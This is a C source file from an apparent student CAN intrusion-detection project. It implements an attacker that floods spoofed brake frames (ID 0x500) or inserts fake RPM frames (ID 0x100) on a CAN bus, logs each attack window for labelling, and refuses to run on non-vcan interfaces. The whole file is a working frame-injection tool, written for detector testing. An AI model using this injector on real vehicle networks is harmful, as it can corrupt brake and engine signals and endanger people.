/* can_attacker.c - CAN-Sentinel attacker (Week 2, Member 2)
 *
 * SAFETY: refuses to run on any interface whose name does not start with "vcan".
 *
 * Modes (Week 2 contract):
 *   flood   spoofed brake frames, ID 0x500, default every 1 ms
 *   insert  extra spoofed RPM frames, ID 0x100, default every 5 ms
 *
 * Every run appends one row to the attack log (epoch seconds, CLOCK_REALTIME,
 * the same clock python-can uses):
 *   start_ts,end_ts,mode,target_id
 *
 * Usage:
 *   ./can_attacker -m flood|insert [-i vcan0] [-r period_ms] [-d seconds]
 *                  [-l data/attack_log.csv]
 */
#define _POSIX_C_SOURCE 200809L
#include <errno.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>
#include "can_common.h"

static volatile sig_atomic_t stop_flag = 0;
static void on_signal(int s) { (void)s; stop_flag = 1; }

static void ts_add_ns(struct timespec *t, long ns)
{
    t->tv_nsec += ns;
    while (t->tv_nsec >= 1000000000L) { t->tv_nsec -= 1000000000L; t->tv_sec++; }
}

static double now_real(void)
{
    struct timespec t;
    clock_gettime(CLOCK_REALTIME, &t);
    return (double)t.tv_sec + (double)t.tv_nsec / 1e9;
}

static void usage(const char *p)
{
    fprintf(stderr,
        "Usage: %s -m flood|insert [-i iface] [-r period_ms] [-d seconds] [-l logfile]\n"
        "  -m  attack mode: flood (ID 0x500, default 1 ms) or insert (ID 0x100, default 5 ms)\n"
        "  -i  interface, must start with 'vcan' (default vcan0)\n"
        "  -r  send period in ms (default depends on mode)\n"
        "  -d  duration in seconds (default 10)\n"
        "  -l  attack log CSV (default data/attack_log.csv)\n", p);
}

static int append_log(const char *path, double start, double end,
                      const char *mode, unsigned id)
{
    struct stat st;
    int need_header = (stat(path, &st) != 0 || st.st_size == 0);
    FILE *f = fopen(path, "a");
    if (!f) { perror("attacker: open log"); return -1; }
    if (need_header) fprintf(f, "start_ts,end_ts,mode,target_id\n");
    fprintf(f, "%.6f,%.6f,%s,0x%X\n", start, end, mode, id);
    fclose(f);
    return 0;
}

int main(int argc, char **argv)
{
    const char *iface = "vcan0", *mode = NULL, *logpath = "data/attack_log.csv";
    long period_ms = 0;
    double duration = 10.0;
    int opt;

    while ((opt = getopt(argc, argv, "i:m:r:d:l:h")) != -1) {
        switch (opt) {
        case 'i': iface = optarg; break;
        case 'm': mode = optarg; break;
        case 'r': period_ms = atol(optarg); break;
        case 'd': duration = atof(optarg); break;
        case 'l': logpath = optarg; break;
        default:  usage(argv[0]); return 2;
        }
    }

    /* ---- safety guard: vcan only ---- */
    if (strncmp(iface, "vcan", 4) != 0) {
        fprintf(stderr, "REFUSED: interface '%s' is not a vcan interface. "
                        "This attacker only runs on vcan*.\n", iface);
        return 3;
    }

    if (!mode) { usage(argv[0]); return 2; }
    unsigned target_id;
    if (strcmp(mode, "flood") == 0) {
        target_id = 0x500;
        if (period_ms <= 0) period_ms = 1;
    } else if (strcmp(mode, "insert") == 0) {
        target_id = 0x100;
        if (period_ms <= 0) period_ms = 5;
    } else {
        fprintf(stderr, "attacker: unknown mode '%s' (use flood or insert)\n", mode);
        return 2;
    }
    if (duration <= 0) { fprintf(stderr, "attacker: duration must be > 0\n"); return 2; }

    int sock = can_open(iface);
    if (sock < 0) { fprintf(stderr, "attacker: cannot open %s\n", iface); return 1; }

    struct sigaction sa;
    memset(&sa, 0, sizeof sa);
    sa.sa_handler = on_signal;
    sigaction(SIGINT, &sa, NULL);
    sigaction(SIGTERM, &sa, NULL);

    srand(42);
    const long period_ns = period_ms * 1000000L;
    const long total_frames_max = (long)(duration * 1000.0 / (double)period_ms);

    fprintf(stderr, "Attack: mode=%s id=0x%X iface=%s period=%ld ms duration=%.1f s\n",
            mode, target_id, iface, period_ms, duration);

    struct timespec next;
    clock_gettime(CLOCK_MONOTONIC, &next);

    double start_ts = 0.0, end_ts = 0.0;
    long sent = 0;
    uint8_t counter = 0;

    while (!stop_flag && sent < total_frames_max) {
        uint8_t data[8] = {0};

        if (target_id == 0x500) {
            /* spoofed brake frame: plausible level, own counter in byte 7 */
            data[0] = (uint8_t)(rand() % 101);
            data[7] = counter;
        } else {
            /* spoofed RPM frame: plausible value 800..6000, big-endian + counter */
            uint16_t rpm = (uint16_t)(800 + (sent * 7) % 5200);
            can_pack(data, rpm, counter);
        }

        if (sent == 0) start_ts = now_real();      /* just before first frame */
        if (can_send(sock, target_id, data, 8) < 0) {
            perror("attacker: can_send");          /* e.g. ENOBUFS under flood */
        } else {
            end_ts = now_real();                   /* just after last good frame */
            sent++;
        }
        counter++;

        ts_add_ns(&next, period_ns);
        while (clock_nanosleep(CLOCK_MONOTONIC, TIMER_ABSTIME, &next, NULL) == EINTR
               && !stop_flag)
            ;
    }

    close(sock);

    if (sent == 0) { fprintf(stderr, "attacker: no frames sent, nothing logged\n"); return 1; }

    if (append_log(logpath, start_ts, end_ts, mode, target_id) == 0)
        fprintf(stderr, "Done: %ld frames. Logged to %s (%.6f -> %.6f)\n",
                sent, logpath, start_ts, end_ts);
    return 0;
}
